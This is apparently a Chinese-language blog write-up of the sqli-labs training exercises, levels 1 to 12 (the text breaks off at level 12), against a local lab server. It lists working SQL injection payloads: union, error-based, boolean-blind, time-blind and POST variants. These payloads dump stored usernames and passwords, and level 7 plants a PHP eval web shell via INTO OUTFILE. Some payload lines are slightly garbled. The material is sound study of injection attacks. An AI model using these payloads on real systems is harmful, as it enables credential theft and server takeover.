    <url>/2025/10/27/sqlilab%E9%A2%98%E8%A7%A3&amp;&amp;%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="闭合报错"><a href="#闭合报错" class="headerlink" title="闭合报错"></a>闭合报错</h1><ul><li><pre><code class="hljs">?id=1’?id=1”<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><br>  - 如果都报错，则为整形闭合<br><br>    尝试?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>--+<br><br>    - 无报错则整形闭合。报错则整形加括号<br><br>  - 如果单引号报错，双引号不报错<br><br>    尝试?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>&#x27;--+<br>  <br>    - 无报错则单引号闭合。报错则单引号加括号<br>  <br>  - 如果单引号不报错，双引号报错。<br>    尝试?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&quot;–+</span><br><span class="hljs-string">  </span><br><span class="hljs-string">    - 无报错则双引号闭合。报错则双引号加括号。</span><br><span class="hljs-string"></span><br><span class="hljs-string"># sqlilab</span><br><span class="hljs-string"></span><br><span class="hljs-string">## 1（联合注入）</span><br><span class="hljs-string"></span><br><span class="hljs-string">第一关反馈数字为字符型</span><br><span class="hljs-string"></span><br><span class="hljs-string">注入需要**？id=1’**</span><br><span class="hljs-string"></span><br><span class="hljs-string">- &lt;img src=&quot;</span>https://cdn.jsdelivr.net/gh/zhz<span class="hljs-number">0177</span>/picture-bed<span class="hljs-title">@main</span>/img/<span class="hljs-number">20251027200843970</span>.png<span class="hljs-string">&quot; alt=&quot;</span>image<span class="hljs-number">-20250303140526440</span><span class="hljs-string">&quot; style=&quot;</span>zoom:<span class="hljs-number">33</span>%<span class="hljs-comment">;&quot; /&gt;</span><br><br>  使用？id<span class="hljs-operator">=</span>xx测试<br><br>  ![image<span class="hljs-number">-20250303140624439</span>](https://cdn.jsdelivr.net/gh/zhz<span class="hljs-number">0177</span>/picture-bed<span class="hljs-title">@main</span>/img/<span class="hljs-number">20251027200845249</span>.png)<br><br>- 拆解<br><br>  ![image<span class="hljs-number">-20250303141258773</span>](https://cdn.jsdelivr.net/gh/zhz<span class="hljs-number">0177</span>/picture-bed<span class="hljs-title">@main</span>/img/<span class="hljs-number">20251027200848557</span>.png)<br><br>  有<span class="hljs-number">3</span>段<br><br>- ![image<span class="hljs-number">-20250303141414242</span>](https://cdn.jsdelivr.net/gh/zhz<span class="hljs-number">0177</span>/picture-bed<span class="hljs-title">@main</span>/img/<span class="hljs-number">20251027200851484</span>.png)<br><br>  爆出数据所在位置<br><br>- ![image<span class="hljs-number">-20250303141609972</span>](https://cdn.jsdelivr.net/gh/zhz<span class="hljs-number">0177</span>/picture-bed<span class="hljs-title">@main</span>/img/<span class="hljs-number">20251027200853667</span>.png)<br><br>  爆出版本和库名<br><br>- ![image<span class="hljs-number">-20250303141852965</span>](https://cdn.jsdelivr.net/gh/zhz<span class="hljs-number">0177</span>/picture-bed<span class="hljs-title">@main</span>/img/<span class="hljs-number">20251027200858277</span>.png)<br><br>  查所有表名<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">  http:</span>//sqli-labs-master:<span class="hljs-number">82</span>/Less<span class="hljs-number">-1</span>/?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-variable">%27</span>union<span class="hljs-variable">%20</span><span class="hljs-keyword">select</span><span class="hljs-variable">%201</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span>group_concat(table_name)<span class="hljs-variable">%20</span>from<span class="hljs-variable">%20</span>information_schema.tables<span class="hljs-variable">%20</span>where<span class="hljs-variable">%20</span>table_schema<span class="hljs-operator">=</span><span class="hljs-variable">%27</span>security<span class="hljs-variable">%27</span>--+<br><br>- 用户的账号密码大概率在user![image<span class="hljs-number">-20250303142024485</span>](https://cdn.jsdelivr.net/gh/zhz<span class="hljs-number">0177</span>/picture-bed<span class="hljs-title">@main</span>/img/<span class="hljs-number">20251027200907510</span>.png)<br><br>  查列名（得到id）<br><br>- ![image<span class="hljs-number">-20250303143004111</span>](https://cdn.jsdelivr.net/gh/zhz<span class="hljs-number">0177</span>/picture-bed<span class="hljs-title">@main</span>/img/<span class="hljs-number">20251027200909384</span>.png)<br><br>  查询user下的所有列名（得到username  passward）<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">  http:</span>//sqli-labs-master:<span class="hljs-number">82</span>/Less<span class="hljs-number">-1</span>/?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-variable">%27</span>union<span class="hljs-variable">%20</span><span class="hljs-keyword">select</span><span class="hljs-variable">%201</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span>group_concat(column_name)<span class="hljs-variable">%20</span>from<span class="hljs-variable">%20</span>information_schema.columns<span class="hljs-variable">%20</span>where<span class="hljs-variable">%20</span>table_name<span class="hljs-operator">=</span><span class="hljs-variable">%27</span>users<span class="hljs-variable">%27</span>--+<br><br>- 得到对应数据<br><br>  ![image<span class="hljs-number">-20250303143244252</span>](https://cdn.jsdelivr.net/gh/zhz<span class="hljs-number">0177</span>/picture-bed<span class="hljs-title">@main</span>/img/<span class="hljs-number">20251027200934849</span>.png)<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">  http:</span>//sqli-labs-master:<span class="hljs-number">82</span>/Less<span class="hljs-number">-1</span>/?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-variable">%27</span><span class="hljs-variable">%20</span>union<span class="hljs-variable">%20</span><span class="hljs-keyword">select</span><span class="hljs-variable">%201</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span>group_concat(username<span class="hljs-variable">%20</span><span class="hljs-punctuation">,</span>id<span class="hljs-variable">%20</span><span class="hljs-punctuation">,</span><span class="hljs-variable">%20</span>password)<span class="hljs-variable">%20</span>from<span class="hljs-variable">%20</span>users--+<br><br>## <span class="hljs-number">2</span><br><br>- ![image<span class="hljs-number">-20250303143820028</span>](https://cdn.jsdelivr.net/gh/zhz<span class="hljs-number">0177</span>/picture-bed<span class="hljs-title">@main</span>/img/<span class="hljs-number">20251027200939723</span>.png)<br><br>  ![image<span class="hljs-number">-20250303143841256</span>](https://cdn.jsdelivr.net/gh/zhz<span class="hljs-number">0177</span>/picture-bed<span class="hljs-title">@main</span>/img/<span class="hljs-number">20251027200943709</span>.png)<br><br>   第二关**无**数字反馈 为数字型  <br><br>  注入需要**？id<span class="hljs-operator">=</span><span class="hljs-number">1</span>**<br><br>  <br><br></code></pre></td></tr></table></figure>?id=1 order by 3?id=-1 union select 1,2,3?id=-1 union select 1,database(),version()?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;?id=-1 union select 1,2,group_concat(username ,id , password) from users<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>  一步一步来<br><br>- ![image-20250303144100313](https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027200951228.png)<br><br>  分段<br><br>- ![image-20250303144127923](https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027200954804.png)<br><br>  爆出数据所在位置<br><br>- ![image-20250303144243223](https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027200958809.png)<br><br>- ![image-20250303144258358](https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201002264.png)<br><br>- ![image-20250303144321219](https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201006378.png)<br><br>- ![image-20250303144339430](https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201010066.png)<br><br><span class="hljs-comment">## 3</span><br><br>- ![image-20250303144432279](https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201014052.png)<br><br>  测试出现括号，且为字符型<br><br>- ```<br>  ?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27;)--+（闭合括号）</span><br><span class="hljs-string">  ?id=1&#x27;</span>) order by 3--+<br>  ?<span class="hljs-built_in">id</span>=-1<span class="hljs-string">&#x27;) union select 1,2,3--+</span><br><span class="hljs-string">  ?id=-1&#x27;</span>) union <span class="hljs-keyword">select</span> 1,database(),version()--+<br>  ?<span class="hljs-built_in">id</span>=-1<span class="hljs-string">&#x27;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="hljs-string">&#x27;--+</span><br><span class="hljs-string">  ?id=-1&#x27;</span>) union <span class="hljs-keyword">select</span> 1,2,group_concat(column_name) from information_schema.columns <span class="hljs-built_in">where</span> table_name=<span class="hljs-string">&#x27;users&#x27;</span>--+<br>  ?<span class="hljs-built_in">id</span>=-1<span class="hljs-string">&#x27;) union select 1,2,group_concat(username ,id , password) from users--+</span><br></code></pre></td></tr></table></figure>一步一步来</code></pre></li></ul><h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201017611.png" alt="image-20250303151047094"></p><p>单引号无报错</p><p>使用双引号测试</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201020801.png" alt="image-20250303151140123"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&quot;) order by 3--+（使用双引号测试）（闭合括号）<br>?<span class="hljs-attribute">id</span>=-1&quot;) union select 1,2,3--+<br>?<span class="hljs-attribute">id</span>=-1&quot;) union select 1,database(),version()--+<br>?<span class="hljs-attribute">id</span>=-1&quot;) union select 1,2,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=<span class="hljs-string">&#x27;security&#x27;</span>--+<br>?<span class="hljs-attribute">id</span>=-1&quot;) union select 1,2,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>--+<br>?<span class="hljs-attribute">id</span>=-1&quot;) union select 1,2,group_concat(username ,id , password) <span class="hljs-keyword">from</span> users--+<br></code></pre></td></tr></table></figure></li></ul><h2 id="5（报错注入）"><a href="#5（报错注入）" class="headerlink" title="5（报错注入）"></a>5（报错注入）</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201025778.png" alt="image-20250303151433521"></p><p>字符型</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201027588.png" alt="image-20250303151505518"></p><p>页面无回显（不能使用联合注入）</p></li><li><p>报库（报错注入）<img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201030674.png" alt="image-20250303152134366"></p><p><a href="http://sqli-labs-master:82/Less-5/?id=1%27%20and%20updatexml(1,concat(0x7e,(SELECT%20database()),0x7e),1)%20--+">http://sqli-labs-master:82/Less-5/?id=1%27%20and%20updatexml(1,concat(0x7e,(SELECT%20database()),0x7e),1)%20--+</a></p><p>0x7e是波浪线</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201032668.png" alt="image-20250303152300995"></p><p>报表（全部）（在user概率较大）</p><p><a href="http://sqli-labs-master:82/Less-5/?id=1">http://sqli-labs-master:82/Less-5/?id=1</a>‘ and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select group_concat(table_name)),0x7e) from information_schema.tables where table_schema&#x3D;’security’),0x7e),1) –+</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201036767.png" alt="image-20250303152637118"></p><p>爆列</p><p><a href="http://sqli-labs-master:82/Less-5/?id=1%27%20%20and%20updatexml(1,concat(0x7e,(select%20distinct%20concat(0x7e,%20(select%20group_concat(column_name)),0x7e)%20from%20information_schema.columns%20where%20table_schema=%27security%27%20and%20table_name=%27users%27),0x7e),1)--+">http://sqli-labs-master:82/Less-5/?id=1%27%20%20and%20updatexml(1,concat(0x7e,(select%20distinct%20concat(0x7e,%20(select%20group_concat(column_name)),0x7e)%20from%20information_schema.columns%20where%20table_schema=%27security%27%20and%20table_name=%27users%27),0x7e),1)--+</a></p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201039841.png" alt="image-20250303152911332"></p><p><a href="http://sqli-labs-master:82/Less-5/?id=1%27and%20updatexml(1,concat(0x7e,(select%20distinct%20concat(0x7e,%20(select%20group_concat(username,id,password)),0x7e)%20from%20users%20),0x7e),1)%20--+">http://sqli-labs-master:82/Less-5/?id=1%27and%20updatexml(1,concat(0x7e,(select%20distinct%20concat(0x7e,%20(select%20group_concat(username,id,password)),0x7e)%20from%20users%20),0x7e),1)%20--+</a></p><p>得到数据</p></li></ul><h2 id="6"><a href="#6" class="headerlink" title="6"></a>6</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201047696.png" alt="image-20250303153000044"></p><p>使用双引号</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&quot;<br><br>?<span class="hljs-attribute">id</span>=1&quot; <span class="hljs-keyword">and</span> updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) --+<br><br><br>?<span class="hljs-attribute">id</span>=1&quot; <span class="hljs-keyword">and</span> updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select  group_concat(table_name)),0x7e) <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=<span class="hljs-string">&#x27;security&#x27;</span>),0x7e),1) --+ <br><br>?<span class="hljs-attribute">id</span>=1&quot;and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select group_concat(column_name)),0x7e) <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_schema</span>=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>),0x7e),1) --+<br><br>?<span class="hljs-attribute">id</span>=1&quot;and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select group_concat(username,id,password)),0x7e) <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>),0x7e),1) --+<br></code></pre></td></tr></table></figure></li></ul><h2 id="7（文件写入-布尔盲注）"><a href="#7（文件写入-布尔盲注）" class="headerlink" title="7（文件写入&#x2F;布尔盲注）"></a>7（文件写入&#x2F;布尔盲注）</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201052792.png" alt="image-20250303205727884"></p><p>测试（题目要求使用文件上传）</p></li><li><p><img src="C:\Users\95227\AppData\Roaming\Typora\typora-user-images\image-20250303210120634.png" alt="image-20250303210120634"></p><p>写入文件（仿照木马病毒）</p></li><li><p>先判断断点</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201056146.png" alt="image-20250303211010525"></p><p>有3个断点</p></li><li><p>使用木马病毒的语句</p><p><a href="http://sqli-labs-master:82/Less-7/?id=1%27))union">http://sqli-labs-master:82/Less-7/?id=1&#39;))union</a> select 1,’<?php eval($_REQUEST[1])?>‘,3 into outfile “D:\software\phpstudy_pro\WWW\sqli-labs-master\Less-7\shell.php”– qwe</p><p>(在文件夹less-7中出现shell.php文件 内容为<?php eval($_REQUEST[1])?>以及目标服务器的账户密码)</p></li><li><?php eval($_REQUEST[1])?><p>可以读取php代码，配合菜刀可以进入服务器</p></li></ul><h2 id="8（布尔盲注）"><a href="#8（布尔盲注）" class="headerlink" title="8（布尔盲注）"></a>8（布尔盲注）</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201100207.png" alt="image-20250304125052559"></p><p>  ’ 闭合（只显示正确，错误页面，<strong>布尔盲注</strong>）</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">  <br></code></pre></td></tr></table></figure><p>?id&#x3D;1’and length((select database()))&gt;&#x3D;<strong>5</strong>–+（猜库的长度）</p><p>?id&#x3D;1’ and mid(database(),1,1)&#x3D;<strong>‘s’</strong>–+（猜库的名称）  </p><p>（?id&#x3D;1’ and ascii(substr((select database()),1,1))&#x3D;115–+     <strong>115&#x3D;’s’）</strong></p><p>?id&#x3D;1’ and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;<strong>‘security’</strong>),1,1))&gt;&#x3D;101–+</p><p>（同理猜解出表名，列名）</p><p>?id&#x3D;1’ and ascii(substr((select group_concat(<strong>username,password</strong>) from users),1,1))&#x3D;<strong>68</strong>–+（获取数据）</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">  <br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201104011.png" alt="image-20250304130318563"></p></li></ul><h2 id="9（时间注入）"><a href="#9（时间注入）" class="headerlink" title="9（时间注入）"></a>9（时间注入）</h2><ul><li><p>无论输入什么都没有报错</p><p>使用时间注入</p></li><li><p>判断类型</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201107729.png" alt="image-20250304130800212"></p><p>?id&#x3D;1’ and if(1&#x3D;1,sleep(5),1)–+</p><p>页面有时间延迟，则为真</p></li><li><p>剩余步骤同布尔盲注</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(<span class="hljs-attribute">1</span>=1,sleep(5),1)--+<br>判断参数构造。<br><br>?<span class="hljs-attribute">id</span>=1&#x27;and <span class="hljs-keyword">if</span>(length((select database()))&gt;9,sleep(5),1)--+<br>判断数据库名长度<br> <br>?<span class="hljs-attribute">id</span>=1&#x27;and <span class="hljs-keyword">if</span>(ascii(substr((select database()),1,1))=115,sleep(5),1)--+<br>逐一判断数据库字符<br>?<span class="hljs-attribute">id</span>=1&#x27;and <span class="hljs-keyword">if</span>(length((select group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=database()))&gt;13,sleep(5),1)--+<br>判断所有表名长度<br> <br>?<span class="hljs-attribute">id</span>=1&#x27;and <span class="hljs-keyword">if</span>(ascii(substr((select group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=database()),1,1))&gt;99,sleep(5),1)--+<br>逐一判断表名<br>?<span class="hljs-attribute">id</span>=1&#x27;and <span class="hljs-keyword">if</span>(length((select group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_schema</span>=database() <span class="hljs-keyword">and</span> <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>))&gt;20,sleep(5),1)--+<br>判断所有字段名的长度<br><br>?<span class="hljs-attribute">id</span>=1&#x27;and <span class="hljs-keyword">if</span>(ascii(substr((select group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_schema</span>=database() <span class="hljs-keyword">and</span> <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>),1,1))&gt;99,sleep(5),1)--+<br>逐一判断字段名。<br>?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(length((select group_concat(username,password) <span class="hljs-keyword">from</span> users))&gt;109,sleep(5),1)--+<br>判断字段内容长度<br> <br>?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(ascii(substr((select group_concat(username,password) <span class="hljs-keyword">from</span> users),1,1))&gt;50,sleep(5),1)--+<br>逐一检测内容。<br></code></pre></td></tr></table></figure></li></ul><h2 id="10"><a href="#10" class="headerlink" title="10"></a>10</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201112138.png" alt="image-20250304131058553"></p><p>?id&#x3D;1” and if(1&#x3D;1,sleep(5),1)–+</p><p>双引号闭合</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&quot; <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(<span class="hljs-attribute">1</span>=1,sleep(5),1)--+<br>判断参数构造。<br><br>?<span class="hljs-attribute">id</span>=1&quot;and <span class="hljs-keyword">if</span>(length((select database()))&gt;9,sleep(5),1)--+<br>判断数据库名长度<br> <br>?<span class="hljs-attribute">id</span>=1&quot;and <span class="hljs-keyword">if</span>(ascii(substr((select database()),1,1))=115,sleep(5),1)--+<br>逐一判断数据库字符<br>?<span class="hljs-attribute">id</span>=1&quot;and <span class="hljs-keyword">if</span>(length((select group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=database()))&gt;13,sleep(5),1)--+<br>判断所有表名长度<br> <br>?<span class="hljs-attribute">id</span>=1&quot;and <span class="hljs-keyword">if</span>(ascii(substr((select group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=database()),1,1))&gt;99,sleep(5),1)--+<br>逐一判断表名<br>?<span class="hljs-attribute">id</span>=1&quot;and <span class="hljs-keyword">if</span>(length((select group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_schema</span>=database() <span class="hljs-keyword">and</span> <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>))&gt;20,sleep(5),1)--+<br>判断所有字段名的长度<br><br>?<span class="hljs-attribute">id</span>=1&quot;and <span class="hljs-keyword">if</span>(ascii(substr((select group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_schema</span>=database() <span class="hljs-keyword">and</span> <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>),1,1))&gt;99,sleep(5),1)--+<br>逐一判断字段名。<br>?<span class="hljs-attribute">id</span>=1&quot; <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(length((select group_concat(username,password) <span class="hljs-keyword">from</span> users))&gt;109,sleep(5),1)--+<br>判断字段内容长度<br> <br>?<span class="hljs-attribute">id</span>=1&quot; <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(ascii(substr((select group_concat(username,password) <span class="hljs-keyword">from</span> users),1,1))&gt;50,sleep(5),1)--+<br>逐一检测内容。<br></code></pre></td></tr></table></figure></li></ul><h2 id="11（post注入）"><a href="#11（post注入）" class="headerlink" title="11（post注入）"></a>11（post注入）</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201116206.png" alt="image-20250304131416520"></p><p>写入1‘出现报错</p></li><li><p>抓包（相当于get，直接联合注入）</p><p><img src="C:\Users\95227\AppData\Roaming\Typora\typora-user-images\image-20250304133349636.png" alt="image-20250304133349636"></p><p>也可在username对话框<strong>直接写</strong>联合注入代码</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">1&#x27;or 1=1#<br>1&#x27; order by 3#<br>-1&#x27;  union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>#<br><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select ,version,database(,version#</span><br><span class="hljs-string">-1&#x27;</span>  <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security#</span><br><span class="hljs-string">-1&#x27;</span>  <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&#x27;users#</span><br><span class="hljs-string">-1&#x27;</span>  <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(username ,id , <span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span>#<br></code></pre></td></tr></table></figure></li></ul><h2 id="12"><a href="#12" class="headerlink" title="12"></a>12</h2><p>写入1”出现报错</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201121578.png" alt="image-20250304134337329"></p><p>使用  “）进行闭合</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span>&quot; )or 1=1#<br>1&quot; ) <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span>#<br><span class="hljs-number">-1</span>&quot; ) union select 1,2#<br>-1&quot; ) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> ,<span class="hljs-keyword">version</span>,<span class="hljs-keyword">database</span>(,<span class="hljs-keyword">version</span>#<br><span class="hljs-number">-1</span>&quot; ) union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security#<br>-1&quot; 